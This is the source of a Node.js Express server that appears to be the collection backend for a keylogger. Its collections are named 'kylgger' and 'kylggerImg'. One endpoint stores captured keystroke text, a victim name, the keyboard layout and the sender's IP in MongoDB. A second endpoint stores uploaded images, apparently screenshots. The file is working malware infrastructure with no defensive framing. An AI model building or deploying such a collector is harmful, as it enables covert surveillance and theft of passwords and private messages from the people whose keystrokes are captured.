var express 	= require('express');
var cors 		= require('cors');
var bodyParser 	= require('body-parser');
var app 		= express();
var MongoClient = require('mongodb').MongoClient
var dburl 		= "mongodb://<user_name>:<user_pass>@<ip_address>:<port>/<db_name>"
		//Example :mongodb://testaccoount:123456@123.123.123.123:17209/myDbName
var port 		= process.env.PORT || 3000 ;

app.use(bodyParser.json({parameterLimit: 100000,limit: '50mb',extended: true }));
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/',(req,res)=>{
	
	MongoClient.connect(dburl, function(err, db) {
	var collection = db.collection('kylgger');

	console.log("Text = " + req.query.text + "  ||| Name  =" + req.query.name + "||| Layout = " + req.query.layout);
	collection.insertOne({name: req.query.name, text :req.query.text
		, ip: req.headers['x-forwarded-for'], layout:req.query.layout} , (err,result)=>{

		console.log("DBye eklendi!" + result)
		db.close();
	});
  	
	});

	res.send("Working!" + req.query.text);
});

app.post('/image',(req,res)=>{

	MongoClient.connect(dburl, function(err, db) {
	var collection = db.collection('kylggerImg');

	console.log("||| Name  =" + req.body.name);
	collection.insertOne({name: req.body.name, ip: req.headers['x-forwarded-for'] + "", image: req.body.image },(err,result)=>{

		console.log("DBye eklendi!" + result)
		db.close();
	});
  	
	});

	res.send("hi!");
});

app.listen(port, () => { console.log("App startred to listen port = " + port );});
